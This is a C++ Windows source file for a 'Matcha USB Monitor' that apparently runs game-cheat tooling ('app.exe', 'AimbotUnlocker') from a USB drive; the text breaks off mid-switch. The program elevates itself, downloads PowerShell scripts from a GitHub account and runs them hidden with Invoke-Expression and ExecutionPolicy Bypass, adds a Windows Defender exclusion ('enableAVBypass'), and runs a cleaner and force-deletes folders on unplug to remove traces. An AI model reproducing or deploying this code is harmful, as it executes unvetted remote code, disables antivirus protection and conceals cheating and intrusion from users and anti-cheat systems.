#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <thread>
#include <string>
#include <urlmon.h>
#include <fstream>
#include <shellapi.h>
#include <atomic>
#include <map>
#include <vector>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

#define WIN32_LEAN_AND_MEAN

std::atomic<bool> usbPluggedIn(false);
std::atomic<bool> exclusionActive(false);
std::atomic<bool> shouldExit(false);

PROCESS_INFORMATION pi = {0};
PROCESS_INFORMATION aimbotPi = {0};

struct Settings {
    bool enableCursorChanger = true;
    bool enableAVBypass = true;
    bool closeAppOnUSBUnplug = false;
    bool autoRunCleanerOnUSB = true;
    bool showMonitor = false;
    bool runAimbotUnlocker = true;
    
    std::wstring aimbotUnlockerPath = L"J:\\Storage\\AimbotUnlocker.exe";
    
    std::vector<std::wstring> exePaths = {L"J:\\Matcha\\usermode\\app.exe"};
    
    std::vector<std::wstring> storageFolders = {L"J:\\Storage\\matcha"};
    std::vector<std::wstring> tempFolders = {L"C:\\matcha"};
    std::vector<std::wstring> exclusionPaths = {L"J:"};
    
    std::vector<std::wstring> startAppKeys = {L"VK_PRIOR"};
    std::vector<std::wstring> stopAppKeys = {L"VK_END"};
    std::vector<std::wstring> runCleanerKeys = {L"VK_HOME"};
    
    std::wstring CleanerLink = L"https://raw.githubusercontent.com/TheMasterHacker2244/newui/refs/heads/main/Cleaner.ps1";
    std::wstring PowerShellPlugin = L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/PluginPowerShell.ps1";
    std::wstring PowerShellEject = L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/EjectPowerShell.ps1";
    
    bool runPluginPowershell = true;
    bool runEjectPowershell = true;
    
    bool MapperDeletion = false;
    
    int usbCheckInterval = 1000;
    int settingsCheckInterval = 10000;
};

std::wstring settingsPath = L"J:\\Storage\\Settings.json";
Settings currentSettings;

std::map<std::wstring, int> keyMap = {
    {L"VK_PRIOR", VK_PRIOR}, {L"PRIOR", VK_PRIOR}, {L"PAGEUP", VK_PRIOR},
    {L"VK_NEXT", VK_NEXT}, {L"NEXT", VK_NEXT}, {L"PAGEDOWN", VK_NEXT},
    {L"VK_END", VK_END}, {L"END", VK_END},
    {L"VK_HOME", VK_HOME}, {L"HOME", VK_HOME},
    {L"VK_INSERT", VK_INSERT}, {L"INSERT", VK_INSERT},
    {L"VK_DELETE", VK_DELETE}, {L"DELETE", VK_DELETE},
    {L"VK_UP", VK_UP}, {L"UP", VK_UP},
    {L"VK_DOWN", VK_DOWN}, {L"DOWN", VK_DOWN},
    {L"VK_LEFT", VK_LEFT}, {L"LEFT", VK_LEFT},
    {L"VK_RIGHT", VK_RIGHT}, {L"RIGHT", VK_RIGHT},
    {L"VK_F1", VK_F1}, {L"F1", VK_F1},
    {L"VK_F2", VK_F2}, {L"F2", VK_F2},
    {L"VK_F3", VK_F3}, {L"F3", VK_F3},
    {L"VK_F4", VK_F4}, {L"F4", VK_F4},
    {L"VK_F5", VK_F5}, {L"F5", VK_F5},
    {L"VK_F6", VK_F6}, {L"F6", VK_F6},
    {L"VK_F7", VK_F7}, {L"F7", VK_F7},
    {L"VK_F8", VK_F8}, {L"F8", VK_F8},
    {L"VK_F9", VK_F9}, {L"F9", VK_F9},
    {L"VK_F10", VK_F10}, {L"F10", VK_F10},
    {L"VK_F11", VK_F11}, {L"F11", VK_F11},
    {L"VK_F12", VK_F12}, {L"F12", VK_F12},
    {L"NUMPAD0", VK_NUMPAD0}, {L"NUM0", VK_NUMPAD0},
    {L"NUMPAD1", VK_NUMPAD1}, {L"NUM1", VK_NUMPAD1},
    {L"NUMPAD2", VK_NUMPAD2}, {L"NUM2", VK_NUMPAD2},
    {L"NUMPAD3", VK_NUMPAD3}, {L"NUM3", VK_NUMPAD3},
    {L"NUMPAD4", VK_NUMPAD4}, {L"NUM4", VK_NUMPAD4},
    {L"NUMPAD5", VK_NUMPAD5}, {L"NUM5", VK_NUMPAD5},
    {L"NUMPAD6", VK_NUMPAD6}, {L"NUM6", VK_NUMPAD6},
    {L"NUMPAD7", VK_NUMPAD7}, {L"NUM7", VK_NUMPAD7},
    {L"NUMPAD8", VK_NUMPAD8}, {L"NUM8", VK_NUMPAD8},
    {L"NUMPAD9", VK_NUMPAD9}, {L"NUM9", VK_NUMPAD9}
};

void RunPowerShellScriptHidden(const std::wstring& url);
void ExecutePowerShellFromURL(const std::wstring& url);
void ExecuteHiddenPowerShell(const std::wstring& command);
void ExecutePowerShellAsAdmin(const std::wstring& command);
bool IsRunningAsAdmin();

int StringToVK(const std::wstring& keyStr) {
    auto it = keyMap.find(keyStr);
    if (it != keyMap.end()) {
        return it->second;
    }
    return 0;
}

std::wstring Trim(const std::wstring& str) {
    size_t start = str.find_first_not_of(L" \t\n\r");
    if (start == std::wstring::npos) return L"";
    size_t end = str.find_last_not_of(L" \t\n\r");
    return str.substr(start, end - start + 1);
}

std::wstring ExtractJsonString(const std::wstring& json, const std::wstring& key) {
    std::wstring searchStr = L"\"" + key + L"\":";
    size_t pos = json.find(searchStr);
    if (pos == std::wstring::npos) return L"";
    
    pos += searchStr.length();
    size_t start = json.find(L'"', pos);
    if (start == std::wstring::npos) return L"";
    start++;
    
    size_t end = json.find(L'"', start);
    if (end == std::wstring::npos) return L"";
    
    return Trim(json.substr(start, end - start));
}

std::vector<std::wstring> ExtractJsonStringArray(const std::wstring& json, const std::wstring& key) {
    std::vector<std::wstring> result;
    std::wstring searchStr = L"\"" + key + L"\":";
    size_t pos = json.find(searchStr);
    if (pos == std::wstring::npos) return result;
    
    pos += searchStr.length();
    size_t start = json.find(L'[', pos);
    if (start == std::wstring::npos) return result;
    start++;
    
    size_t end = json.find(L']', start);
    if (end == std::wstring::npos) return result;
    
    std::wstring arrayContent = json.substr(start, end - start);
    size_t itemStart = 0;
    while (itemStart < arrayContent.length()) {
        size_t quoteStart = arrayContent.find(L'"', itemStart);
        if (quoteStart == std::wstring::npos) break;
        quoteStart++;
        
        size_t quoteEnd = arrayContent.find(L'"', quoteStart);
        if (quoteEnd == std::wstring::npos) break;
        
        std::wstring item = Trim(arrayContent.substr(quoteStart, quoteEnd - quoteStart));
        if (!item.empty()) {
            result.push_back(item);
        }
        itemStart = quoteEnd + 1;
    }
    
    if (result.empty()) {
        std::wstring single = ExtractJsonString(json, key);
        if (!single.empty()) result.push_back(single);
    }
    
    return result;
}

bool ExtractJsonBool(const std::wstring& json, const std::wstring& key) {
    std::wstring searchStr = L"\"" + key + L"\":";
    size_t pos = json.find(searchStr);
    if (pos == std::wstring::npos) return false;
    
    pos += searchStr.length();
    size_t start = json.find_first_not_of(L" \t\n\r", pos);
    if (start == std::wstring::npos) return false;
    
    size_t end = json.find_first_of(L",}", start);
    if (end == std::wstring::npos) return false;
    
    std::wstring value = Trim(json.substr(start, end - start));
    return value == L"true";
}

int ExtractJsonInt(const std::wstring& json, const std::wstring& key) {
    std::wstring searchStr = L"\"" + key + L"\":";
    size_t pos = json.find(searchStr);
    if (pos == std::wstring::npos) return 0;
    
    pos += searchStr.length();
    size_t start = json.find_first_not_of(L" \t\n\r", pos);
    if (start == std::wstring::npos) return 0;
    
    size_t end = json.find_first_of(L",}", start);
    if (end == std::wstring::npos) return 0;
    
    std::wstring value = Trim(json.substr(start, end - start));
    return _wtoi(value.c_str());
}

Settings LoadSettings() {
    Settings settings;
    
    FILE* file = _wfopen(settingsPath.c_str(), L"r, ccs=UTF-8");
    if (!file) {
        return settings;
    }
    
    std::wstring jsonContent;
    wchar_t buffer[4096];
    while (fgetws(buffer, sizeof(buffer)/sizeof(buffer[0]), file)) {
        jsonContent += buffer;
    }
    fclose(file);
    
    std::wstring cleanJson;
    size_t start = 0;
    while (start < jsonContent.length()) {
        size_t end = jsonContent.find(L'\n', start);
        if (end == std::wstring::npos) end = jsonContent.length();
        
        std::wstring line = jsonContent.substr(start, end - start);
        size_t commentPos = line.find(L"--");
        if (commentPos != std::wstring::npos) {
            line = line.substr(0, commentPos);
        }
        cleanJson += line + L"\n";
        start = end + 1;
    }
    
    settings.enableCursorChanger = ExtractJsonBool(cleanJson, L"enableCursorChanger");
    settings.enableAVBypass = ExtractJsonBool(cleanJson, L"enableAVBypass");
    settings.closeAppOnUSBUnplug = ExtractJsonBool(cleanJson, L"closeAppOnUSBUnplug");
    settings.autoRunCleanerOnUSB = ExtractJsonBool(cleanJson, L"autoRunCleanerOnUSB");
    settings.showMonitor = ExtractJsonBool(cleanJson, L"showMonitor");
    settings.runAimbotUnlocker = ExtractJsonBool(cleanJson, L"runAimbotUnlocker");
    
    settings.aimbotUnlockerPath = ExtractJsonString(cleanJson, L"aimbotUnlockerPath");
    if (settings.aimbotUnlockerPath.empty()) {
        settings.aimbotUnlockerPath = L"J:\\Storage\\AimbotUnlocker.exe";
    }
    
    settings.exePaths = ExtractJsonStringArray(cleanJson, L"exePaths");
    
    settings.storageFolders = ExtractJsonStringArray(cleanJson, L"storageFolders");
    settings.tempFolders = ExtractJsonStringArray(cleanJson, L"tempFolders");
    settings.exclusionPaths = ExtractJsonStringArray(cleanJson, L"exclusionPaths");
    
    settings.startAppKeys = ExtractJsonStringArray(cleanJson, L"startAppKeys");
    settings.stopAppKeys = ExtractJsonStringArray(cleanJson, L"stopAppKeys");
    settings.runCleanerKeys = ExtractJsonStringArray(cleanJson, L"runCleanerKeys");
    
    settings.CleanerLink = ExtractJsonString(cleanJson, L"CleanerLink");
    settings.PowerShellPlugin = ExtractJsonString(cleanJson, L"PowerShellPlugin");
    settings.PowerShellEject = ExtractJsonString(cleanJson, L"PowerShellEject");
    
    settings.runPluginPowershell = ExtractJsonBool(cleanJson, L"runPluginPowershell");
    settings.runEjectPowershell = ExtractJsonBool(cleanJson, L"runEjectPowershell");
    
    settings.MapperDeletion = ExtractJsonBool(cleanJson, L"MapperDeletion");
    
    settings.usbCheckInterval = ExtractJsonInt(cleanJson, L"usbCheckInterval");
    settings.settingsCheckInterval = ExtractJsonInt(cleanJson, L"settingsCheckInterval");
    
    if (settings.CleanerLink.empty()) {
        settings.CleanerLink = L"https://raw.githubusercontent.com/TheMasterHacker2244/newui/refs/heads/main/Cleaner.ps1";
    }
    
    if (settings.PowerShellPlugin.empty()) {
        settings.PowerShellPlugin = L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/PluginPowerShell.ps1";
    }
    
    if (settings.PowerShellEject.empty()) {
        settings.PowerShellEject = L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/EjectPowerShell.ps1";
    }
    
    return settings;
}

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

void RunAsAdmin() {
    wchar_t modulePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, modulePath, MAX_PATH) == 0) return;
    
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = modulePath;
    sei.nShow = SW_HIDE;
    
    ShellExecuteExW(&sei);
    ExitProcess(0);
}

void ExecuteHiddenCommand(const std::wstring& command) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::wstring fullCmd = L"cmd.exe /c " + command;
    wchar_t* cmd = _wcsdup(fullCmd.c_str());
    
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    free(cmd);
}

void ExecuteHiddenPowerShell(const std::wstring& command) {
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::wstring fullCmd = L"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + command + L"\"";
    wchar_t* cmd = _wcsdup(fullCmd.c_str());
    
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    free(cmd);
}

void ExecutePowerShellAsAdmin(const std::wstring& command) {
    std::wstring psCommand = L"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + command + L"\"";
    
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = L"powershell.exe";
    sei.lpParameters = psCommand.c_str();
    sei.nShow = SW_HIDE;
    
    ShellExecuteExW(&sei);
}

void RunPowerShellScriptHidden(const std::wstring& url) {
    std::wstring command = L"$scriptPath = [IO.Path]::GetTempFileName() + \\\".ps1\\\"; (Invoke-WebRequest \\\"" + url + L"\\\" -UseBasicParsing).Content | Out-File $scriptPath -Encoding UTF8; & powershell -ExecutionPolicy Bypass -File $scriptPath; Remove-Item $scriptPath -Force";
    
    if (IsRunningAsAdmin()) {
        ExecuteHiddenPowerShell(command);
    } else {
        ExecutePowerShellAsAdmin(command);
    }
}

void ExecutePowerShellFromURL(const std::wstring& url) {
    std::wstring command = L"try { $webClient = New-Object System.Net.WebClient; $script = $webClient.DownloadString('" + url + L"'); Invoke-Expression $script; Write-Host 'Script executed successfully' } catch { Write-Host 'Error: ' + $_.Exception.Message }";
    
    if (IsRunningAsAdmin()) {
        ExecuteHiddenPowerShell(command);
    } else {
        ExecutePowerShellAsAdmin(command);
    }
}

void RunPluginScript() {
    if (!currentSettings.runPluginPowershell || currentSettings.PowerShellPlugin.empty()) return;
    
    std::wcout << L"Running plugin script: " << currentSettings.PowerShellPlugin << std::endl;
    ExecutePowerShellFromURL(currentSettings.PowerShellPlugin);
}

void RunEjectScript() {
    if (!currentSettings.runEjectPowershell || currentSettings.PowerShellEject.empty()) return;
    
    std::wcout << L"Running eject script: " << currentSettings.PowerShellEject << std::endl;
    ExecutePowerShellFromURL(currentSettings.PowerShellEject);
}

void RunSystemTrayScript() {
    std::wstring command = L"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray\" /v \"Services\" /t reg_dword /d 29 /f; systray";
    ExecuteHiddenCommand(command);
}

void RunCursorToArrowScript() {
    std::wstring command = 
        L"Add-Type -Namespace Win32 -Name API -MemberDefinition @\"\n"
        L"[System.Runtime.InteropServices.DllImport(\"user32.dll\", EntryPoint=\"LoadCursorW\")]\n"
        L"public static extern System.IntPtr LoadCursor(System.IntPtr h, int n);\n"
        L"[System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n"
        L"public static extern System.IntPtr CopyIcon(System.IntPtr h);\n"
        L"[System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n"
        L"public static extern bool SetSystemCursor(System.IntPtr h, uint id);\n"
        L"\"@\n\n"
        L"$arrow = [Win32.API]::LoadCursor([System.IntPtr]::Zero, 32512)\n\n"
        L"$copy1 = [Win32.API]::CopyIcon($arrow)\n"
        L"$success1 = [Win32.API]::SetSystemCursor($copy1, 32650)\n\n"
        L"$copy2 = [Win32.API]::CopyIcon($arrow) \n"
        L"$success2 = [Win32.API]::SetSystemCursor($copy2, 32514)\n\n"
        L"Write-Host \"Loading cursors set to normal arrow. AppStarting: $success1, Wait: $success2\"";
    
    ExecuteHiddenPowerShell(command);
}

void RunRestoreDefaultCursorsScript() {
    std::wstring command = 
        L"Add-Type -Namespace Win32 -Name API -MemberDefinition @\"\n"
        L"[System.Runtime.InteropServices.DllImport(\"user32.dll\")]\n"
        L"public static extern bool SystemParametersInfo(uint action, uint param, System.IntPtr vparam, uint init);\n"
        L"\"@\n"
        L"[Win32.API]::SystemParametersInfo(0x0057, 0, [System.IntPtr]::Zero, 0)\n"
        L"Write-Host \"System cursors restored to default.\"";
    
    ExecuteHiddenPowerShell(command);
}

void UpdateSettings() {
    static Settings lastSettings;
    Settings settings = LoadSettings();
    
    if (settings.enableCursorChanger != lastSettings.enableCursorChanger) {
        if (settings.enableCursorChanger && usbPluggedIn) {
            ExecutePowerShellFromURL(L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/CursorsToArrow.ps1");
        } else if (!settings.enableCursorChanger) {
            ExecutePowerShellFromURL(L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/DefaultCursors.ps1");
        }
    }
    
    currentSettings = settings;
    lastSettings = settings;
}

bool IsUSBAvailable() {
    for (const auto& exclusionPath : currentSettings.exclusionPaths) {
        if (exclusionPath.length() < 2) continue;
        
        wchar_t driveLetter = exclusionPath[0];
        DWORD driveMask = GetLogicalDrives();
        bool driveExists = (driveMask & (1 << (driveLetter - 'A'))) != 0;
        bool isRemovable = GetDriveTypeW((std::wstring(1, driveLetter) + L":\\").c_str()) == DRIVE_REMOVABLE;
        
        if (driveExists && isRemovable) {
            return true;
        }
    }
    return false;
}

void ToggleDefenderExclusion(bool addExclusion) {
    if (!currentSettings.enableAVBypass) return;
    
    for (const auto& exclusionPath : currentSettings.exclusionPaths) {
        std::wstring command;
        if (addExclusion) {
            command = L"Add-MpPreference -ExclusionPath '" + exclusionPath + L"' -ErrorAction SilentlyContinue";
        } else {
            command = L"Remove-MpPreference -ExclusionPath '" + exclusionPath + L"' -ErrorAction SilentlyContinue";
        }
        
        if (IsRunningAsAdmin()) {
            ExecuteHiddenPowerShell(command);
        }
    }
    
    exclusionActive = addExclusion;
}

bool ForceDeleteFolder(const std::wstring& folderPath) {
    if (!currentSettings.MapperDeletion) return false;
    
    std::wstring command = L"rd /s /q \"" + folderPath + L"\" 2>nul";
    ExecuteHiddenCommand(command);
    
    return GetFileAttributesW(folderPath.c_str()) == INVALID_FILE_ATTRIBUTES;
}

bool CopyStorageFolder() {
    std::wstring sourceFolder;
    for (const auto& folder : currentSettings.storageFolders) {
        if (GetFileAttributesW(folder.c_str()) != INVALID_FILE_ATTRIBUTES) {
            sourceFolder = folder;
            break;
        }
    }
    
    if (sourceFolder.empty()) return false;
    
    std::wstring destFolder = currentSettings.tempFolders.empty() ? L"C:\\matcha" : currentSettings.tempFolders[0];
    
    ForceDeleteFolder(destFolder);
    
    std::wstring command = L"xcopy \"" + sourceFolder + L"\" \"" + destFolder + L"\" /E /I /H /Y >nul 2>&1";
    ExecuteHiddenCommand(command);
    
    DWORD newAttr = GetFileAttributesW(destFolder.c_str());
    return (newAttr != INVALID_FILE_ATTRIBUTES && (newAttr & FILE_ATTRIBUTE_DIRECTORY));
}

bool IsProcessRunning(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (std::wstring(pe.szExeFile) == processName) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return found;
}

void StopProcessByName(const std::wstring& processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (std::wstring(pe.szExeFile) == processName) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
}

void StopAppByName() {
    StopProcessByName(L"app.exe");
}

void StartAimbotUnlocker() {
    if (!currentSettings.runAimbotUnlocker || currentSettings.aimbotUnlockerPath.empty()) return;
    
    // Check if file exists
    if (GetFileAttributesW(currentSettings.aimbotUnlockerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        if (currentSettings.showMonitor) {
            std::wcout << L"AimbotUnlocker not found: " << currentSettings.aimbotUnlockerPath << std::endl;
        }
        return;
    }
    
    // Extract process name for checking if already running
    size_t lastSlash = currentSettings.aimbotUnlockerPath.find_last_of(L"\\");
    std::wstring processName = (lastSlash != std::wstring::npos) ? 
        currentSettings.aimbotUnlockerPath.substr(lastSlash + 1) : currentSettings.aimbotUnlockerPath;
    
    if (IsProcessRunning(processName)) {
        if (currentSettings.showMonitor) {
            std::wcout << L"AimbotUnlocker is already running: " << processName << std::endl;
        }
        return;
    }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION localPi = {0};
    wchar_t* cmd = _wcsdup(currentSettings.aimbotUnlockerPath.c_str());

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &localPi)) {
        aimbotPi = localPi;
        if (currentSettings.showMonitor) {
            std::wcout << L"Started AimbotUnlocker: " << currentSettings.aimbotUnlockerPath << std::endl;
        }
    } else {
        if (currentSettings.showMonitor) {
            std::wcout << L"Failed to start AimbotUnlocker: " << GetLastError() << std::endl;
        }
    }
    
    free(cmd);
}

void StopAimbotUnlocker() {
    if (!currentSettings.runAimbotUnlocker || currentSettings.aimbotUnlockerPath.empty()) return;
    
    // Extract process name
    size_t lastSlash = currentSettings.aimbotUnlockerPath.find_last_of(L"\\");
    std::wstring processName = (lastSlash != std::wstring::npos) ? 
        currentSettings.aimbotUnlockerPath.substr(lastSlash + 1) : currentSettings.aimbotUnlockerPath;
    
    StopProcessByName(processName);
    
    if (aimbotPi.hProcess != NULL) {
        TerminateProcess(aimbotPi.hProcess, 0);
        CloseHandle(aimbotPi.hProcess);
        CloseHandle(aimbotPi.hThread);
        aimbotPi.hProcess = NULL;
        aimbotPi.hThread = NULL;
    }
    
    if (currentSettings.showMonitor) {
        std::wcout << L"Stopped AimbotUnlocker" << std::endl;
    }
}

void StartApp() {
    if (!IsUSBAvailable()) return;
    if (IsProcessRunning(L"app.exe")) return;
    if (!CopyStorageFolder()) return;

    std::wstring exePath;
    for (const auto& path : currentSettings.exePaths) {
        if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
            exePath = path;
            break;
        }
    }
    
    if (exePath.empty()) return;

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION localPi = {0};
    wchar_t* cmd = _wcsdup(exePath.c_str());

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &localPi)) {
        pi = localPi;
        std::wcout << L"Started app: " << exePath << std::endl;
    } else {
        std::wcout << L"Failed to start app: " << GetLastError() << std::endl;
    }
    
    free(cmd);
}

void StopApp() {
    StopAppByName();
    if (pi.hProcess != NULL) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        pi.hProcess = NULL;
        pi.hThread = NULL;
    }
}

void SetCursorsToArrow() {
    if (!currentSettings.enableCursorChanger) return;
    RunCursorToArrowScript();
}

void RestoreDefaultCursors() {
    if (!currentSettings.enableCursorChanger) return;
    RunRestoreDefaultCursorsScript();
}

void RunCleaner() {
    RunPowerShellScriptHidden(currentSettings.CleanerLink);
}

void HandleUSBStateChange(bool usbNowAvailable) {
    if (usbNowAvailable) {
        std::wcout << L"USB plugged in - Starting setup..." << std::endl;
        UpdateSettings();
        
        std::wcout << L"Running plugin script..." << std::endl;
        RunPluginScript();
        
        std::wcout << L"Running system tray script..." << std::endl;
        RunSystemTrayScript();
        
        if (currentSettings.enableCursorChanger) {
            std::wcout << L"Setting cursors to arrow..." << std::endl;
            SetCursorsToArrow();
            ExecutePowerShellFromURL(L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/CursorsToArrow.ps1");
        }
        
        if (currentSettings.autoRunCleanerOnUSB) {
            std::wcout << L"Running cleaner..." << std::endl;
            RunCleaner();
        }
        
        std::wcout << L"Setting Defender exclusions..." << std::endl;
        ToggleDefenderExclusion(true);
        
        std::wcout << L"Copying storage folder..." << std::endl;
        CopyStorageFolder();
        
        if (currentSettings.runAimbotUnlocker) {
            std::wcout << L"Starting AimbotUnlocker..." << std::endl;
            StartAimbotUnlocker();
        }
        
        std::wcout << L"USB setup complete!" << std::endl;
    } else {
        std::wcout << L"USB unplugged - Cleaning up..." << std::endl;
        
        std::wcout << L"Running eject script..." << std::endl;
        RunEjectScript();
        
        if (currentSettings.enableCursorChanger) {
            std::wcout << L"Restoring default cursors..." << std::endl;
            RestoreDefaultCursors();
            ExecutePowerShellFromURL(L"https://github.com/TheMasterHacker2244/newui/raw/refs/heads/main/DefaultCursors.ps1");
        }
        
        if (currentSettings.autoRunCleanerOnUSB) {
            std::wcout << L"Running cleaner..." << std::endl;
            RunCleaner();
        }
        
        std::wcout << L"Removing Defender exclusions..." << std::endl;
        ToggleDefenderExclusion(false);
        
        if (currentSettings.closeAppOnUSBUnplug) {
            std::wcout << L"Stopping app..." << std::endl;
            StopApp();
        }
        
        if (currentSettings.runAimbotUnlocker) {
            std::wcout << L"Stopping AimbotUnlocker..." << std::endl;
            StopAimbotUnlocker();
        }
        
        Sleep(1000);
        for (const auto& tempFolder : currentSettings.tempFolders) {
            std::wcout << L"Deleting temp folder: " << tempFolder << std::endl;
            ForceDeleteFolder(tempFolder);
        }
        
        std::wcout << L"USB cleanup complete!" << std::endl;
    }
}

void USBMONITOR() {
    bool lastState = IsUSBAvailable();
    HandleUSBStateChange(lastState);
    usbPluggedIn = lastState;
    
    while (!shouldExit) {
        bool currentState = IsUSBAvailable();
        
        if (currentState != lastState) {
            HandleUSBStateChange(currentState);
            usbPluggedIn = currentState;
            lastState = currentState;
        }
        
        Sleep(currentSettings.usbCheckInterval);
    }
}

void SettingsMonitor() {
    FILETIME lastWriteTime = {0};
    
    while (!shouldExit) {
        WIN32_FILE_ATTRIBUTE_DATA fileData;
        if (GetFileAttributesExW(settingsPath.c_str(), GetFileExInfoStandard, &fileData)) {
            if (CompareFileTime(&fileData.ftLastWriteTime, &lastWriteTime) != 0) {
                lastWriteTime = fileData.ftLastWriteTime;
                UpdateSettings();
            }
        }
        
        Sleep(currentSettings.settingsCheckInterval);
    }
}

void RegisterHotKeys() {
    UnregisterHotKey(NULL, 1);
    UnregisterHotKey(NULL, 2);
    UnregisterHotKey(NULL, 3);
    
    for (const auto& key : currentSettings.startAppKeys) {
        int vk = StringToVK(key);
        if (vk != 0) RegisterHotKey(NULL, 1, 0, vk);
    }
    
    for (const auto& key : currentSettings.stopAppKeys) {
        int vk = StringToVK(key);
        if (vk != 0) RegisterHotKey(NULL, 2, 0, vk);
    }
    
    for (const auto& key : currentSettings.runCleanerKeys) {
        int vk = StringToVK(key);
        if (vk != 0) RegisterHotKey(NULL, 3, 0, vk);
    }
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    FreeConsole();
    
    if (!IsRunningAsAdmin()) {
        RunAsAdmin();
    }
    
    currentSettings = LoadSettings();
    UpdateSettings();
    
    if (currentSettings.showMonitor) {
        AllocConsole();
        FILE* f;
        freopen_s(&f, "CONOUT$", "w", stdout);
        freopen_s(&f, "CONOUT$", "w", stderr);
        std::wcout << L"Starting Matcha USB Monitor..." << std::endl;
    }
    
    usbPluggedIn = IsUSBAvailable();
    if (currentSettings.showMonitor) {
        std::wcout << L"USB initially: " << (usbPluggedIn ? L"Plugged in" : L"Not plugged in") << std::endl;
        std::wcout << L"Show monitor: " << (currentSettings.showMonitor ? L"True" : L"False") << std::endl;
        std::wcout << L"Run plugin powershell: " << (currentSettings.runPluginPowershell ? L"True" : L"False") << std::endl;
        std::wcout << L"Run eject powershell: " << (currentSettings.runEjectPowershell ? L"True" : L"False") << std::endl;
        std::wcout << L"Mapper deletion: " << (currentSettings.MapperDeletion ? L"True" : L"False") << std::endl;
        std::wcout << L"Close app on USB unplug: " << (currentSettings.closeAppOnUSBUnplug ? L"True" : L"False") << std::endl;
        std::wcout << L"Run AimbotUnlocker: " << (currentSettings.runAimbotUnlocker ? L"True" : L"False") << std::endl;
        std::wcout << L"AimbotUnlocker path: " << currentSettings.aimbotUnlockerPath << std::endl;
    }
    
    HandleUSBStateChange(usbPluggedIn);
    
    std::thread usbThread(USBMONITOR);
    std::thread settingsThread(SettingsMonitor);
    
    RegisterHotKeys();

    if (currentSettings.showMonitor) {
        std::wcout << L"Monitoring started. Press hotkeys to control app." << std::endl;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && !shouldExit) {
        if (msg.message == WM_HOTKEY) {
            if (currentSettings.showMonitor) {
                switch (msg.wParam) {
                    case 1:
                        if (usbPluggedIn) {
                            std::wcout << L"Hotkey: Starting app..." << std::endl;
                            StartApp();
                        }
                        break;
                    case 2:
                        std::wcout << L"Hotkey: Stopping app..." << std::endl;
                        StopApp();
                        break;
                    case 3:
